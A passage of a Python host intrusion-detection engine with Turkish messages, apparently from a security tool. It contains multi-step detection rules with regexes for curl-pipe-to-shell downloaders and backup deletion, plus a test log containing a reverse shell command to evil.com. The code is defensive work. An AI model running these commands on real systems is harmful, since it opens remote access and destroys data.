                                    {"sudo_command_contains_any": ["authorized_keys", ".ssh/authorized_keys", "/etc/ssh/sshd_config", "PermitRootLogin", "PasswordAuthentication", "/etc/sudoers", "/etc/sudoers.d", "/etc/doas.conf", "/etc/systemd/system", "/etc/cron", "/etc/crontab"]},
                                    {"service_path_contains_any": ["/etc/systemd/system", ".config/systemd/user", ".timer", ".service"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload"]},
                                        {"command_contains_any": ["apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "cloud-init", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemctl preset", "systemctl reenable", "systemctl restart", "systemctl reload", "/var/backups/", "/srv/backup/", "/backup/", "/backups/", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Erişim veya privesc sonrası hesap manipülasyonu ve kalıcılık/uzak erişim hazırlığı görüldü",
            "summary": "Login ya da privesc başarısını hesap/grup/policy manipülasyonu izledi ve ardından persistence veya remote-access yapılandırması görüldü.",
            "operator_note": "Değiştirilen hesabı, shell/home/policy komutunu ve bunu izleyen SSH/persistence değişikliğinin meşru yönetim işi olup olmadığını birlikte doğrulayın.",
            "mitre_tactic": "TA0003",
            "mitre_technique": "T1098",
            "tags": ["sequence", "post-auth", "privilege-escalation", "account-manipulation", "identity-abuse", "authorized-keys", "sudoers", "remote-access"],
        },
        {
            "id":      "SEQ-066",
            "name":    "Abuse or Downloader → Destructive Action",
            "severity": "critical",
            "score":   96,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["shell_upload", "path_traversal", "sqli_attempt", "http_request", "exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__any__": [
                            {
                                "__all__": [
                                    {
                                        "__any__": [
                                            {"attack_contains_any": ["shell_upload", "path_traversal", "sql_injection"]},
                                            {"path_decoded_lc_contains_any": ["cmd=", "exec=", "command=", "/bin/sh", "/bin/bash", "../", "/etc/passwd", ".php.jpg", ".phtml", ".jsp"]},
                                            {"path_lc_contains_any": ["%24%28id%29", "%60id%60", "%252e%252e%252f", ".php%00", ".php.jpg", ".phtml", ".jsp"]},
                                        ]
                                    },
                                    {
                                        "__not__": {
                                            "__any__": [
                                                {"path_decoded_lc_contains_any": ["/admin/upload", "/admin/media", "/wp-admin/", "/server-status", "/server-info", "/health", "/healthz", "/readyz", "/livez", "/status"]},
                                                {"ua_lc_contains_any": ["kube-probe", "prometheus", "elb-healthchecker"]},
                                            ]
                                        }
                                    },
                                ]
                            },
                            {
                                "__all__": [
                                    {"command_contains_any": ["docker exec ", "podman exec ", "kubectl exec ", "docker run --privileged", "podman run --privileged", "-v /:/host", "--mount type=bind,src=/,dst=/host", "/host/etc/", "/var/lib/kubelet/", "hostPath"]},
                                    {"__not__": {"command_contains_any": ["kubectl exec -n kube-system", "kubectl exec --namespace kube-system", "kubectl exec metrics-server", "kubectl logs ", "docker inspect ", "podman inspect ", "docker ps ", "podman ps ", "/health", "/healthz", "/readyz", "/livez", "-- /bin/true", "-- printenv"]}},
                                ]
                            },
                            {
                                "__all__": [
                                    {
                                        "__any__": [
                                            {"command_regex": r'(?:curl|wget)\s+[^\n|;]*\|\s*(?:bash|sh|dash|python[23]?|perl|ruby|php)\b'},
                                            {"command_regex": r'bash\s+-c\s+["\x27]?\$\((?:curl|wget)\s+'},
                                            {"command_regex": r'(?:curl|wget)\s+[^\n;]*(?:-o|--output|-(?:q)?O| -O )\s*(?:/tmp/|/var/tmp/|/dev/shm/)\S+'},
                                        ]
                                    },
                                    {
                                        "__not__": {
                                            "__any__": [
                                                {"command_contains_any": ["apt ", "apt-get ", "dpkg ", "dnf ", "yum ", "rpm ", "zypper ", "packagekit", "git clone ", "git pull ", "git fetch ", ".deb", ".udeb", ".ddeb", ".rpm", ".repo", "/Packages.gz", "/Packages.xz", "/Release", "/InRelease", "/repodata/repomd.xml", "/repodata/primary.xml", "/repodata/filelists.xml", "/suse/setup/descr", "/content", "bootstrap", "repo", "/health", "/healthz", "/readyz", "/livez", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion "]},
                                                {"command_token_contains_any": ["bootstrap", "debug", "healthcheck"]},
                                            ]
                                        }
                                    },
                                ]
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_regex": r'(?:^|\s)rm\s+-rf?\s+(?:/home/|/var/www/|/srv/|/var/backups/|/srv/backup/|/backup/|/backups/|/snapshots?/|/\.snapshots?/|/var/lib/(?:restic|borg|snapper|rsnapshot)/)\S*'},
                                    {"command_regex": r'find\s+.*(?:/home/|/var/www/|/srv/|/var/backups/?|/srv/backup/?|/backup/?|/backups/?|/snapshots?/|/\.snapshots?/)\S*\s+.*-delete'},
                                    {"command_regex": r'(?:shred|wipe|srm|dd\s+if=/dev/(?:zero|null|urandom))\s+.*(?:/home/|/var/www/|/srv/|/var/backups/|/srv/backup/|/backup/|/backups/|/snapshots?/|/\.snapshots?/)'},
                                    {"command_regex": r'(?:^|\s)chattr\s+[+-]i\s+.*(?:/var/backups/|/srv/backup/|/backup/|/backups/|/snapshots?/|/\.snapshots?/|/var/lib/(?:restic|borg|snapper|rsnapshot)/|\.snapshot)'},
                                    {"command_regex": r'(?:^|\s)btrfs\s+sub(?:volume|vol)\s+delete\s+/\.snapshots?/\S+'},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["rm -rf /tmp/", "rm -rf /var/tmp/", "rm -rf /dev/shm/", "find /tmp", "find /var/tmp", "find /dev/shm", "tmpreaper", "tmpwatch", "systemd-tmpfiles", "apt clean", "apt-get clean", "apt autoremove", "apt-get autoremove", "dnf clean", "yum clean", "zypper clean", "snapper cleanup", "transactional-update cleanup", "packagekit", "logrotate", "journalctl --vacuum", "ansible", "ansible-playbook", "chef-client", "puppet ", "salt-call ", "salt-minion ", "maintenance", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["cleanup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "İstismar/downloader sonrasında destructive action görüldü",
            "summary": "Şüpheli web/container abuse veya downloader davranışını yüksek değerli veri/backup yolunda silme ya da anti-recovery komutu izledi.",
            "operator_note": "İlk istismar/downloader bağlamını, hedeflenen veri yolunu ve bunun rutin cleanup/maintenance işi olmadığını doğrulayın.",
            "mitre_tactic": "TA0005",
            "mitre_technique": "T1070.004",
            "tags": ["sequence", "impact", "destructive", "anti-recovery", "web", "container", "downloader"],
        },
    ]

    # Longest timeout, auto-derived for DB cleanup
    MAX_TIMEOUT = max(s["timeout"] for s in SEQUENCES)

    def __init__(self, db=None, language: str = "tr"):
        self._db = db
        self.language = normalize_language(language, default="tr")
        self._state: Dict[str, Dict[str, Dict]] = collections.defaultdict(dict)
        self._ops = 0  # periyodik cleanup sayacı
        self._field_matcher = SemanticFieldMatcher()

        if db:
            # Load sequence states from the DB and convert them to the nested structure.
            # load_sequence_states() returns a flat dict:
            #   {"entity:seq_id": {"step": N, "last_ts": T}}
            # check() nested dict bekler:
            #   self._state[entity][seq_id] = {"step": N, "last_ts": T}
            try:
                flat = db.load_sequence_states()
                restored = 0
                for composite_key, state in flat.items():
                    # "entity:seq_id" → entity + seq_id
                    if ":" in composite_key:
                        # seq_id is always in "SEQ-NNN" format, so take the last segment
                        parts = composite_key.rsplit(":", 1)
                        entity, seq_id = parts[0], parts[1]
                    else:
                        # Beklenmedik format — atla
                        logger.warning(
                            f"[SequenceDetector] Beklenmedik state key: {composite_key!r} — atlandi"
                        )
                        continue
                    self._state[entity][seq_id] = {
                        "step":    state.get("step", 0),
                        "last_ts": state.get("last_ts", 0.0),
                    }
                    restored += 1
                if restored:
                    logger.info(
                        f"[SequenceDetector] {restored} sequence state DB'den restore edildi"
                    )
            except Exception as e:
                logger.warning(f"[SequenceDetector] State restore hatasi: {e} — sifirdan basliyor")

    def _field_value(self, fields: Dict[str, Any], key: str) -> Any:
        return self._field_matcher.semantic_value(fields, key)

    def _entity(self, event: NormalizedEvent, entity_type: str = "auto") -> Optional[str]:
        """
        Sequence için entity anahtarı üret.
        None döndürürse bu event bu sequence için atlanır — "unknown"
        bucket kirliliği önlenir.
        """
        if entity_type == "host":
            return event.host or event.src_ip or event.user or None
        if entity_type.startswith("field:"):
            field_val = self._field_value(event.fields, entity_type.split(":", 1)[1])
            return str(field_val) if field_val else (event.host or event.src_ip or event.user or None)
        if entity_type == "user":
            return event.user or event.src_ip or event.host or None
        if entity_type == "ip":
            return event.src_ip or event.user or event.host or None
        # auto: src_ip varsa kullan, yoksa user, yoksa host
        return event.src_ip or event.user or event.host or None

    def _match_field_condition(self, event: NormalizedEvent, key: str, expected: Any) -> bool:
        return self._field_matcher.match_field_condition(event.fields, key, expected)

    def _step_matches(self, step: Dict, event: NormalizedEvent) -> bool:
        if "category" in step:
            category = step["category"]
            if isinstance(category, list):
                if event.category not in category:
                    return False
            elif event.category != category:
                return False
        if "action" in step:
            action = step["action"]
            if isinstance(action, list):
                if event.action not in action:
                    return False
            elif event.action != action:
                return False
        if "outcome" in step:
            outcome = step["outcome"]
            if isinstance(outcome, list):
                if event.outcome not in outcome:
                    return False
            elif event.outcome != outcome:
                return False
        if "fields" in step:
            if not self._field_matcher.match_fields(event.fields, step["fields"]):
                return False
        return True

    def check(self, event: NormalizedEvent) -> List[DetectionResult]:
        results = []
        now     = event.ts or time.time()

        for seq in self.SEQUENCES:
            sid         = seq["id"]
            timeout     = seq["timeout"]
            steps       = seq["steps"]
            entity_type = seq.get("entity_type", "auto")
            entity      = self._entity(event, entity_type)

            # Skip the event for this sequence when the entity cannot be resolved to avoid polluting the "unknown" bucket
            if entity is None:
                continue

            if entity not in self._state:
                self._state[entity] = {}

            if sid not in self._state[entity]:
                self._state[entity][sid] = {"step": 0, "last_ts": now}

            state = self._state[entity][sid]

            # Timeout — reset it
            if now - state["last_ts"] > timeout:
                state["step"]    = 0
                state["last_ts"] = now
                if self._db:
                    self._db.delete_sequence_state(entity, sid)

            current_step = state["step"]

            if self._step_matches(steps[current_step], event):
                state["step"]    += 1
                state["last_ts"]  = now

                # DB'ye kaydet
                if self._db:
                    self._db.set_sequence_state(
                        entity, sid, state["step"], now
                    )

                # Chain completed
                if state["step"] >= len(steps):
                    localized_message = get_localized_rule_text(seq, "message", self.language)
                    results.append(DetectionResult(
                        triggered        = True,
                        rule_id          = sid,
                        severity         = seq["severity"],
                        score            = seq["score"],
                        category         = "sequence",
                        message          = localized_message,
                        rule_file        = "sequence_detector",
                        mitre_tactic     = seq.get("mitre_tactic", "TA0002"),
                        mitre_technique  = seq.get("mitre_technique", "T1059"),
                        tags             = seq.get("tags", ["sequence", "multi-step"]),
                        details          = {
                            "sequence_name": seq["name"],
                            "entity":        entity,
                            "steps":         len(steps),
                            "summary":       get_localized_rule_text(seq, "summary", self.language),
                            "operator_note": get_localized_rule_text(seq, "operator_note", self.language),
                        }
                    ))
                    state["step"] = 0
                    if self._db:
                        self._db.delete_sequence_state(entity, sid)

        self._ops += 1
        # Her 10_000 event'te bir in-memory stale state'leri temizle
        if self._ops % 10_000 == 0:
            self._cleanup_stale_memory()
        return results

    def _cleanup_stale_memory(self) -> int:
        """Clean up in-memory sequence states whose timeout has expired."""
        now = time.time()
        max_timeout = self.MAX_TIMEOUT
        stale_entities = []
        for entity, seqs in self._state.items():
            all_stale = all(
                now - s.get("last_ts", 0) > max_timeout
                for s in seqs.values()
            )
            if all_stale and seqs:
                stale_entities.append(entity)
        for e in stale_entities:
            del self._state[e]
        if stale_entities:
            logger.debug(f"[SEQ] in-memory cleanup: {len(stale_entities)} stale entity temizlendi")
        return len(stale_entities)


SequenceDetector.SEQUENCES = _enrich_internal_rule_collection(SequenceDetector.SEQUENCES)
SequenceDetector.MAX_TIMEOUT = max(s["timeout"] for s in SequenceDetector.SEQUENCES)


# ── Ana DetectionEngine ───────────────────────────────────────────────────────

class DetectionEngine:
    """
    Tüm instant detection modüllerini orkestre eder.
    FirstSeenDetector kaldırıldı — first_seen predicate RuleEngine içinde.
    """

    def __init__(self, config: Dict = None, db=None,
                 ioc_file: str = "config/ioc_list.txt",
                 allow_empty_rules: bool = False,
                 distro_family: str = "unknown"):
        cfg          = config or {}
        rules_source = cfg.get("rules_source", "yaml")
        rules_dir    = cfg.get("rules_dir", "rules")
        self.language = resolve_language(config=cfg, env=os.environ, default="tr")

        self.rule_engine = RuleEngine(
            rules_dir    = rules_dir,
            rules_source = rules_source,
            allow_empty  = allow_empty_rules,
            distro_family= distro_family,
            db           = db,
            language     = self.language,
        )
        self.regex     = RegexDetector(rules_dir=rules_dir)
        self.ioc       = IOCMatcher(ioc_file)
        thr_cfg = cfg.get("thresholds", {})
        thr_cfg.setdefault("rules_dir", cfg.get("rules_dir", "rules"))
        self.threshold = ThresholdDetector(thr_cfg)
        self.sequence  = SequenceDetector(db=db, language=self.language)
        self._stats    = {"events": 0, "alerts": 0}
        logger.info("[DETECTION] DetectionEngine hazır.")

    def set_db(self, db) -> None:
        """Late-bind the DB."""
        self.rule_engine.set_db(db)
        # Bug #12: SequenceDetector uses self._db, not .db
        self.sequence._db = db

    def analyze(self, event: NormalizedEvent,
                current_phase: int = 0) -> List[DetectionResult]:
        self._stats["events"] += 1
        results = []
        results.extend(self.rule_engine.check(event))
        results.extend(self.regex.check(event))
        results.extend(self.ioc.check(event))
        results.extend(self.threshold.check(event))
        results.extend(self.sequence.check(event))
        triggered = [r for r in results if r.triggered]
        self._stats["alerts"] += len(triggered)
        return triggered

    def stats(self) -> Dict:
        return self._stats.copy()


# ── Test ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s [%(levelname)s] %(message)s")

    from .normalize import Normalizer
    norm = Normalizer()
    engine = DetectionEngine()

    test_logs = [
        ("Mar  5 12:34:56 host sshd[1]: Accepted password for root from 1.2.3.4 port 22222 ssh2", "auth.log"),
        ("Mar  5 12:35:00 host sshd[2]: Failed password for admin from 5.6.7.8 port 11111 ssh2", "auth.log"),
        ("Mar  5 12:35:01 host sshd[3]: Failed password for admin from 5.6.7.8 port 11112 ssh2", "auth.log"),
        ("Mar  5 12:35:02 host sshd[4]: Failed password for admin from 5.6.7.8 port 11113 ssh2", "auth.log"),
        ("Mar  5 12:35:03 host sshd[5]: Failed password for admin from 5.6.7.8 port 11114 ssh2", "auth.log"),
        ("Mar  5 12:35:04 host sshd[6]: Failed password for admin from 5.6.7.8 port 11115 ssh2", "auth.log"),
        ("Mar  5 12:35:10 host sudo[10]: alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1", "auth.log"),
    ]

    print("\n=== Detection Test ===\n")
    for raw, src in test_logs:
        evt = norm.normalize(raw, src)
        if not evt:
            continue
        detections = engine.analyze(evt)
        if detections:
            print(f"LOG: {raw[30:80]}...")
            for d in detections:
                print(f"  🚨 [{d.severity.upper()}] {d.rule_id}: {d.message} (score={d.score})")
            print()

    print(f"Stats: {engine.stats()}")
